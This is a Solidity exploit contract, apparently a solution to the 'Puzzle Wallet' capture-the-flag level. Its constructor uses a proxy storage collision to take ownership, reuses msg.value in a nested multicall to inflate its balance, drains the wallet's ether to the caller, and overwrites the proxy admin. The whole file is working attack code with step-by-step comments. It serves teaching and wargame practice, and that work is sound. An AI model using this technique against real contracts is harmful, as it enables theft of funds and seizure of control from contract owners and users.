// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPuzzleProxy {
    function proposeNewAdmin(address _newAdmin) external;
}

interface IPuzzleWallet {
    function addToWhitelist(address addr) external;

    function deposit() external payable;

    function execute(
        address to,
        uint256 value,
        bytes memory data
    ) external payable;

    function multicall(bytes[] memory data) external payable;

    function setMaxBalance(uint256 _maxBalance) external;
}

contract PuzzleWalletHack {
    constructor(address _victim) payable {
        IPuzzleWallet puzzleWallet = IPuzzleWallet(_victim);
        IPuzzleProxy puzzleProxy = IPuzzleProxy(_victim);

        // overwrite PuzzleWallet.owner
        puzzleProxy.proposeNewAdmin(address(this));

        // contract now has permission to call `addToWhitelist()`
        // whitelist this contract
        puzzleWallet.addToWhitelist(address(this));

        // we need to transfer out the balance from the wallet contract to be able to call setMaxBalance()
        // contract initially has 0.001 ether from the factory
        // in order to fully transfer out the full balance without access to the factory,
        // we need to replay deposit() twice, but one without actually sending any value
        // eg. if we deposit 0.001 ether more, total balance would be 0.002 ether
        // and then if we could increase the accounting for our address in balances[address(this)] to increase to 0.002 ether, without actually sending any more ether,
        // we could then transfer out the full 0.002 ether balance.
        // So we have to somehow reuse msg.value
        // multicall() already limits deposit() to a max of one per call
        // but we could do a nested multicall() which has a deposit() inside to reuse the outer msg.value without triggering the above check:
        // multicall(
        //   1. deposit 0.001 ether      // here we actually do the ether transfer that increases our accounting to 0.001 ether and uses the msg.value
        //   2. multicall(
        //     2.1 deposit 0.001 ether   // this deposit also goes through fine and increases our accounting to 0.002 ether, but actually re-uses the msg.value from the outer call
        //   )
        // )
        // we prepare the calldata appropriately:
        bytes memory deposit = abi.encodeWithSelector(
            IPuzzleWallet.deposit.selector
        );
        bytes[] memory calldataArray = new bytes[](1);
        calldataArray[0] = deposit;
        bytes memory multicall = abi.encodeWithSelector(
            IPuzzleWallet.multicall.selector,
            calldataArray
        );
        bytes[] memory outerCalldataArray = new bytes[](2);
        outerCalldataArray[0] = deposit;
        outerCalldataArray[1] = multicall;

        // perform the nested multicall
        puzzleWallet.multicall{value: 0.001 ether}(outerCalldataArray);

        // we can now use the execute() method to do the ether transfer
        puzzleWallet.execute(msg.sender, 0.002 ether, "");

        // setMaxBalance updates PuzzleWallet.maxBalance which overwrites PuzzleProxy.admin
        puzzleWallet.setMaxBalance(uint256(uint160(msg.sender)));
    }
}
